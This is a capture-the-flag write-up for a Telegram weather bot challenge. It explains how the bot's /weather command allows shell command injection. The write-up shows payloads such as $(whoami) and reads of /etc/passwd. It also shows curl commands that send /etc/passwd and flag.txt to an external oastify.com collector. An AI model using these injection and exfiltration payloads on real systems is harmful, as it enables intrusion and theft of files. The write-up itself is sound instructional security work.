# Weather

Open the provided url with Telegram. Run the `/start` command to perform a basic interaction

The response will be:

> Want to know the weather? Just type /weather followed by the city name.

The response to the `/weather` command without arguments is:

> Weather in Rzeszów: 8 °C - UVI: 2.8 - Wind: 3.09 m/s SSE - Humidity: 76% - Pressure: 1007 hPa

Lets try to pass something to the command, for example `/weather Radom`.

Now the answer is:

> Weather in Radom: 9 °C - UVI: 2.72 - Wind: 5.14 m/s S - Humidity: 70% - Pressure: 1017 hPa

What if we try something with a more complex argument? Like `/weather Łódź bałuty`:

> ERROR: Cannot fetch weather data

Looks like the command is badly implemented. How is the response even generated? Could it be a cli tool? Try to do something with the argument. We can see that running `/weather $(whoami)` results in showing output, while `/weather $(/etc/passwd)` shows an error. But `/weather $(cat /etc/passwd | cut -f 1 -d ':' | head -n1)` works fine again. 

Looks like we can use this endpoint as a remote shell, but at the same time the output will not be as good here. Why not try sending the output via curl requests?

```
/weather $(curl -d @/etc/passwd ucalk9iqbci1hzafbcgdy7j2atgk4bs0.oastify.com)
```

It works! But where is the flag? Maybe in the working directory?

```
/weather $(curl -d @flag.txt ucalk9iqbci1hzafbcgdy7j2atgk4bs0.oastify.com)
```

The flag is in the response:

```
POST / HTTP/1.1
Host: ucalk9iqbci1hzafbcgdy7j2atgk4bs0.oastify.com
User-Agent: curl/8.5.0
Accept: */*
Content-Length: 16
Content-Type: application/x-www-form-urlencoded

1753{its_raining_maaaaaannn_!}
```
Will give us the solution to this challenge
